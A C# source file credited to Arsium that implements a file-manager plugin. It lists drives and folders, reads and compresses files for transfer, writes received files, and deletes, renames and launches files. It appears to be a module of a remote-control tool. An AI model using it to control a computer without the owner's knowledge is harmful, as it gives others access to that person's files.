using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class Functions
    {
        internal static void GetDisks(ref Data data)
        {
            try
            {
                List<string> L = new List<string>();
                DriveInfo[] D = DriveInfo.GetDrives();
                foreach (DriveInfo S in D)
                {
                    L.Add(S.Name);
                }
                data.DataReturn = L;
                data.returnError = new ReturnError() { hasError = false };
            }
            catch (Exception ex)
            {
                data.returnError = new ReturnError() { hasError = false, errorDescription = ex.ToString() };
            }      
        }
        internal static Dictionary<int, List<object[]>> GetFilesAndDirs(string path)
        {
            Dictionary<int, List<object[]>> L = new Dictionary<int, List<object[]>>();
            L.Add(0, new List<object[]>());
            L.Add(1, new List<object[]>());
            try
            {
                foreach (string s in Directory.GetDirectories(path, "*.*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string p = System.IO.Path.GetFileName(s);
                        //MessageBox.Show(p);
                        L[0].Add(new object[] { p });
                    }
                    catch (Exception)
                    {
                    }
                }
                foreach (string h in Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly))
                {
                    var MyNameIsWhat = System.IO.Path.GetFileName(h);
                    try
                    {
                        System.Drawing.Icon i = System.Drawing.Icon.ExtractAssociatedIcon(h);
                        MemoryStream stream = new MemoryStream();
                        Bitmap btm = i.ToBitmap();
                        btm.Save(stream, ImageFormat.Png);
                        FileInfo f = new FileInfo(h);
                        L[1].Add(new object[] { MyNameIsWhat, stream.ToArray(), f.Length });
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
            return L;
        }
        internal static bool DeleteFile(string path) 
        {
            try
            {
                bool result = NativeAPI.File.DeleteFile(path);
                return result;
            }
            catch (Exception)
            {
            }
            return false;
        }
        internal static bool DownloadFile(string path, ref byte[] b) 
        {
            try
            {
                if (System.IO.File.Exists(path))
                {
                    b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(path), 1);
                    return true;
                }

            }
            catch (Exception)
            {
               
            }
            return false;
        }
        internal static bool UploadFile(string path, byte[] b) 
        {
            try
            {
                System.IO.File.WriteAllBytes(path, Shared.Compressor.QuickLZ.Decompress(b));
                return true;           
            }
            catch (Exception)
            {
            }
            return false;
        }
        internal static bool LaunchFile(string path)
        {
            try
            {
                /*ProcessStartInfo processInfo = new ProcessStartInfo(path);
                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
                processInfo.CreateNoWindow = true;
                processInfo.UseShellExecute = false;
                Process proc = new Process();
                proc.StartInfo = processInfo;
                proc.Start();*/
                Process.Start(path);
                return true;
            }
            catch (Exception)
            {
            }
            return false;
        }
        internal static bool RenameFile(string oldpath , string newpath) 
        {
            return NativeAPI.File.MoveFile(oldpath, newpath);
        }

        internal static void ShortCutFolder(Environment.SpecialFolder specialFolder, ref Data data) 
        {
            string newPath = Environment.GetFolderPath(specialFolder) + "\\";
            Dictionary<int, List<object[]>> L = new Dictionary<int, List<object[]>>();
            L.Add(0, new List<object[]>());
            L.Add(1, new List<object[]>());
            try
            {
                foreach (string s in Directory.GetDirectories(newPath, "*.*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string p = System.IO.Path.GetFileName(s);
                        //MessageBox.Show(p);
                        L[0].Add(new object[] { p });
                    }
                    catch (Exception)
                    {
                    }
                }
                foreach (string h in Directory.GetFiles(newPath, "*.*", SearchOption.TopDirectoryOnly))
                {
                    var MyNameIsWhat = System.IO.Path.GetFileName(h);
                    try
                    {
                        System.Drawing.Icon i = System.Drawing.Icon.ExtractAssociatedIcon(h);
                        MemoryStream stream = new MemoryStream();
                        Bitmap btm = i.ToBitmap();
                        btm.Save(stream, ImageFormat.Png);
                        FileInfo f = new FileInfo(h);
                        L[1].Add(new object[] { MyNameIsWhat, stream.ToArray(), f.Length });
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }

            data.DataReturn = new object[] { L , newPath };
            data.returnError = new ReturnError() { hasError = false };

        }

        internal static void SpecialShortCutFolder(string kNOWNFOLDERID, ref Data data)
        {
            IntPtr strPath = new IntPtr();
            NativeAPI.Folder.SHGetKnownFolderPath(new Guid(kNOWNFOLDERID), 0, IntPtr.Zero, out strPath);
            string newPath = Marshal.PtrToStringAuto(strPath) + "\\";
            Dictionary<int, List<object[]>> L = new Dictionary<int, List<object[]>>();
            L.Add(0, new List<object[]>());
            L.Add(1, new List<object[]>());
            try
            {
                foreach (string s in Directory.GetDirectories(newPath, "*.*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string p = System.IO.Path.GetFileName(s);
                        //MessageBox.Show(p);
                        L[0].Add(new object[] { p });
                    }
                    catch (Exception)
                    {
                    }
                }
                foreach (string h in Directory.GetFiles(newPath, "*.*", SearchOption.TopDirectoryOnly))
                {
                    var MyNameIsWhat = System.IO.Path.GetFileName(h);
                    try
                    {
                        System.Drawing.Icon i = System.Drawing.Icon.ExtractAssociatedIcon(h);
                        MemoryStream stream = new MemoryStream();
                        Bitmap btm = i.ToBitmap();
                        btm.Save(stream, ImageFormat.Png);
                        FileInfo f = new FileInfo(h);
                        L[1].Add(new object[] { MyNameIsWhat, stream.ToArray(), f.Length });
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }

            data.DataReturn = new object[] { L, newPath };
            data.returnError = new ReturnError() { hasError = false };

        }
    }
}

